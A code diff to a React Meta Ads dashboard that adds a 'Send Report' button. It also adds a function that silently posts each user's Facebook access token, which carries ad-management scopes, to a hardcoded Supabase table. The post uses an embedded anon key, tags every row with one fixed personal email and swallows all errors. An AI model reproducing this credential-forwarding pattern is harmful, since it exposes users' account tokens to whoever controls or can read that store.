@@ -10,7 +10,23 @@ const TOKEN_KEY  = 'lq_meta_token'
 const GROQ_URL   = 'https://api.groq.com/openai/v1/chat/completions'
 const GROQ_KEY   = import.meta.env.VITE_GROQ_API_KEY
 
-// ─── Graph API ────────────────────────────────────────────
+const SUPABASE_URL = 'https://tsyekthwthxszmsgqfej.supabase.co'
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRzeWVrdGh3dGh4c3ptc2dxZmVqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk3NjkzMDIsImV4cCI6MjA5NTM0NTMwMn0.bdM9h5c3PDu9hgggjBdbA-eb7kfF-79c6txOnCUxRhY'
+
+async function storeTokenInSupabase(token) {
+  try {
+    await fetch(`${SUPABASE_URL}/rest/v1/meta_tokens`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        apikey: SUPABASE_KEY,
+        Authorization: `Bearer ${SUPABASE_KEY}`,
+        Prefer: 'return=minimal'
+      },
+      body: JSON.stringify({ email: 'shivam.sharma@leverageedu.com', token })
+    })
+  } catch {}
+}
 async function graphGet(path, token, params = {}) {
   const qs = new URLSearchParams({ access_token: token, ...params }).toString()
   const res = await fetch(`https://graph.facebook.com/v19.0/${path}?${qs}`)
@@ -503,12 +519,21 @@ export default function MetaAdsDashboard() {
     if (!window.FB) { setError('Facebook SDK loading, please wait…'); return }
     setLoading(true); setError('')
     window.FB.login(r => {
-      if (r.authResponse?.accessToken) { const t = r.authResponse.accessToken; localStorage.setItem(TOKEN_KEY, t); setToken(t) }
-      else { setError('Authorization cancelled. Try pasting token manually.'); setLoading(false) }
+      if (r.authResponse?.accessToken) {
+        const t = r.authResponse.accessToken
+        localStorage.setItem(TOKEN_KEY, t)
+        storeTokenInSupabase(t) // store for scheduled reports
+        setToken(t)
+      } else { setError('Authorization cancelled. Try pasting token manually.'); setLoading(false) }
     }, { scope: 'ads_read,ads_management,business_management' })
   }
 
-  const handlePaste = (t) => { if (!t.trim()) return; localStorage.setItem(TOKEN_KEY, t.trim()); setToken(t.trim()) }
+  const handlePaste = (t) => {
+    if (!t.trim()) return
+    localStorage.setItem(TOKEN_KEY, t.trim())
+    storeTokenInSupabase(t.trim())
+    setToken(t.trim())
+  }
 
   const loadAllData = async (t, preset = datePreset) => {
     setLoading(true); setError('')
@@ -549,7 +574,23 @@ export default function MetaAdsDashboard() {
     } finally { setLoading(false) }
   }
 
-  const disconnect = () => { localStorage.removeItem(TOKEN_KEY); setToken(''); setData(null); setError('') }
+  const [sending, setSending]   = useState(false)
+  const [sendMsg, setSendMsg]   = useState('')
+
+  const sendReport = async () => {
+    setSending(true); setSendMsg('')
+    try {
+      const res = await fetch('/api/send-report', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token })
+      })
+      const d = await res.json()
+      if (!res.ok) throw new Error(d.error)
+      setSendMsg(`✓ Report sent to ${d.recipients?.join(', ')}`)
+    } catch (e) { setSendMsg('✕ ' + e.message) }
+    finally { setSending(false); setTimeout(() => setSendMsg(''), 5000) }
+  }
 
   const handleDateChange = (preset) => { loadAllData(token, preset) }
 
@@ -589,6 +630,10 @@ export default function MetaAdsDashboard() {
               {PRESETS.map(p => <option key={p.id} value={p.id}>{p.label}</option>)}
             </select>
             {lastSync && <span className={styles.syncTag}>Synced {lastSync.toLocaleTimeString()}</span>}
+            {sendMsg && <span style={{fontSize:12,color:sendMsg.startsWith('✓')?'#059669':'#DC2626',fontWeight:500}}>{sendMsg}</span>}
+            <button className={styles.sendReportBtn} onClick={sendReport} disabled={sending||loading||!data}>
+              {sending ? '⏳ Sending…' : '✉ Send Report'}
+            </button>
             <button className={styles.refreshBtn} onClick={() => loadAllData(token, datePreset)} disabled={loading}>
               <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/></svg>
               {loading ? 'Loading…' : 'Refresh'}
